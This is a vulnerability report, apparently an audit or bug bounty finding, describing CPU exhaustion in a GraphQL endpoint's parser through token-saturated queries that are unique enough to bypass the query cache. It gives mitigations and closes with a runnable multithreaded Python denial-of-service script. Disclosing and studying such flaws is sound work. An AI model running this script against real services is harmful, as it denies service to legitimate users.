### Title
GraphQL Parser Resource Exhaustion via Simultaneous Max-Token and Max-Whitespace-Token Query Saturation Without Rate Limiting

### Summary
The static initializer in `GraphQlConfiguration` sets `maxTokens(1000)` and `maxWhitespaceTokens(1000)` as independent counters, allowing a single request to force the lexer to process up to 2,000 tokens before completing. Because the GraphQL module has no rate limiting and the `PreparsedDocumentProvider` cache is keyed on the raw query string, an unprivileged attacker can continuously send unique queries that each saturate both counters simultaneously, bypassing the cache and forcing maximum per-request parsing CPU on every request.

### Finding Description
**Code location:** `graphql/src/main/java/org/hiero/mirror/graphql/config/GraphQlConfiguration.java`, lines 31–39 (static initializer).

```java
Consumer<Builder> consumer =
    b -> b.maxCharacters(10000).maxRuleDepth(100).maxTokens(1000).maxWhitespaceTokens(1000);
```

`maxTokens` and `maxWhitespaceTokens` are tracked by separate counters in the graphql-java lexer. A query can legally accumulate 1,000 regular tokens **and** 1,000 whitespace tokens simultaneously — the parser processes all 2,000 tokens before either limit triggers a rejection. Within the `maxCharacters(10000)` budget this is easily achievable: 1,000 tokens averaging 5 characters = 5,000 chars, plus 1,000 whitespace tokens averaging 1–5 chars = 1,000–5,000 chars, totalling 6,000–10,000 chars.

**Cache bypass:** `CachedPreparsedDocumentProvider` (lines 24–27) keys the Caffeine cache on `executionInput.getQuery()` — the raw query string. The cache holds at most 1,000 entries (`maximumSize=1000`). An attacker who varies any token (field alias, argument value, extra whitespace pattern) produces a cache miss on every request, forcing a full re-parse each time.

**Post-parse checks do not help:** `MaxQueryComplexityInstrumentation(200)` and `MaxQueryDepthInstrumentation(10)` (lines 43–45) execute only after the document is fully parsed and validated. They do not reduce lexer or parser CPU for the incoming request.

**No rate limiting:** A grep across all GraphQL Java sources confirms zero rate-limiting or throttling code in the `graphql/` module. The design document (`docs/design/contract-log-subscription.md`, line 37) notes "We should implement rate limiting in the load balancer" — this is not implemented at the application layer.

**Exploit flow:**
1. Attacker generates a stream of unique GraphQL queries, each crafted to carry ~1,000 regular tokens and ~1,000 whitespace tokens (e.g., a deeply aliased selection set with liberal whitespace between every token).
2. Each query is unique (different alias names or argument literals), so it never hits the Caffeine cache.
3. The server lexes and parses all 2,000 tokens per request before any limit fires.
4. With no application-level rate limiting, the attacker can sustain this at arbitrary request rates.
5. Legitimate requests, which typically carry 10–50 tokens, compete for the same parsing thread pool.

### Impact Explanation
Each malicious request forces 20–100× more lexer/parser CPU than a typical query. Because the GraphQL module exposes a public HTTP endpoint with no rate limiting, a single attacker with a modest connection rate (e.g., 50–100 req/s) can dominate the parsing thread pool, raising overall node CPU by well over 30% and degrading or denying service to legitimate users. The `GraphQLHighCPU` Prometheus alert fires only above 80% for 5 minutes, meaning sustained degradation below that threshold goes undetected.

### Likelihood Explanation
No authentication or privilege is required — the endpoint is public. The attack requires only an HTTP client and the ability to generate syntactically valid but token-saturated GraphQL strings, which is trivial to script. The cache bypass requires only minor query variation (changing one alias or literal per request), which any scripted attacker will do naturally. The attack is fully repeatable and requires no special knowledge of the application schema beyond what is publicly discoverable via introspection.

### Recommendation
1. **Add application-level rate limiting** to the GraphQL endpoint (analogous to the `ThrottleManager` already present in the `web3` module), enforcing a maximum requests-per-second per IP or connection.
2. **Reduce the token limits** to values closer to what legitimate queries actually require. Audit real query traffic; values of 200–300 tokens are typically sufficient for well-formed queries and reduce the per-request parsing budget by 3–5×.
3. **Reject oversized requests early** at the HTTP layer (e.g., via a servlet filter checking `Content-Length`) before the GraphQL parser is invoked, so malformed or oversized payloads never reach the lexer.
4. **Cap concurrent parse threads** or use a bounded executor for GraphQL parsing to prevent a burst of max-token requests from monopolizing the thread pool.

### Proof of Concept
```python
import requests, threading, itertools, string

URL = "http://<host>:8083/graphql/alpha"

def make_query(n):
    # Generate a unique query with ~1000 tokens and ~1000 whitespace tokens
    # Each alias is unique to bypass the preparsed document cache
    aliases = [f"f{n}_{i}" for i in range(200)]
    fields = "\n  ".join(f"{a}: balance" for a in aliases)
    # Pad with extra whitespace tokens between each field to approach maxWhitespaceTokens
    padded = fields.replace("\n", "\n   \t  \n")
    return f"{{ account(input: {{entityId: {{shard:0,realm:0,num:2}}}}) {{\n  {padded}\n}} }}"

def attack(thread_id):
    for i in itertools.count():
        q = make_query(thread_id * 100000 + i)
        try:
            requests.post(URL,
                json={"query": q},
                headers={"Content-Type": "application/json"},
                timeout=5)
        except Exception:
            pass

# Launch concurrent threads to saturate the parser
threads = [threading.Thread(target=attack, args=(t,)) for t in range(20)]
for t in threads:
    t.start()
for t in threads:
    t.join()
```

Each thread sends unique max-token queries. Monitor `process_cpu_usage{application="graphql"}` via Prometheus — CPU will climb significantly above the baseline within seconds of starting the script.
